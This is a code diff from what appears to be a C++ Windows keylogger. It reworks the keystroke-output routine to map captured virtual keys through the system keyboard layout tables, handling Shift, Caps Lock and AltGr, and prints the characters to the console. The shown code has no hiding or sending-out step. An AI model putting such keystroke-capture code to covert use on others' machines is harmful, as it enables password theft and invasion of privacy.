@@ -1,10 +1,10 @@
 #include "keylogger.h"
 
-#include <iostream>
-
-Keylogger::Keylogger(milliseconds polling) 
-	: Keyboard(polling)
-	, keylog(nullptr) {}	
+Keylogger::Keylogger() 
+	: keylog(nullptr) 
+{
+	std::locale::global(std::locale(""));
+}
 
 void Keylogger::startKeylog() {
 	auto listener = [this]() {
@@ -32,17 +32,49 @@ void Keylogger::setKeysState() {
 	}
 }
 void Keylogger::handleOutput() {
-	const std::vector<Key>& keys = getKeys();
+	auto& keys = getKeys();
+	auto& keysLayoutOuter = layout->pVkToWcharTable;
 
 	bool caps = keys[VK_CAPITAL].isToggled();
 	bool shift = keys[VK_SHIFT].isPressed();
-
 	bool upper = caps != shift;
+	bool ctrl = keys[VK_CONTROL].isPressed();
+	bool alt = keys[VK_MENU].isPressed();
+	bool altgr = ctrl && alt;
+	
+	for (int j = 0; keysLayoutOuter[j].pVkToWchars; j++) {
+		auto& keysLayout = keysLayoutOuter[j];
 
-	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
-		const Key& key = keys[i];
-		if (key.isTriggered() && key.isPressed()) {
-			std::wcout << (wchar_t)key.value;
+		for (auto keyLayout = keysLayout.pVkToWchars; 
+			keyLayout->VirtualKey; 
+			keyLayout = (VK_TO_WCHARS1*)(((PBYTE)keyLayout) + keysLayout.cbSize))
+		{
+			const auto& key = keys[keyLayout->VirtualKey];
+
+			if (!key.isAlternating() || !key.isPressed() || 
+				key.value == VK_RETURN || key.value == VK_BACK || 
+				key.value == VK_TAB)
+			{
+				continue;
+			}
+
+			if (altgr) {
+				if (keysLayout.nModifications >= 4 && ((keyLayout->Attributes & CAPLOKALTGR && upper) || shift)) {
+					std::wcout << keyLayout->wch[3];
+				}
+				else if (keysLayout.nModifications >= 3 && !shift) {
+					std::wcout << keyLayout->wch[2];
+				}
+			}
+			else {
+				if (keysLayout.nModifications >= 2 && ((keyLayout->Attributes & CAPLOK && upper) || shift)) {
+					std::wcout << keyLayout->wch[1];
+				}
+				else {
+					std::wcout << keyLayout->wch[0];
+				}
+			}
+			std::wcout.clear();
 		}
 	}
 }
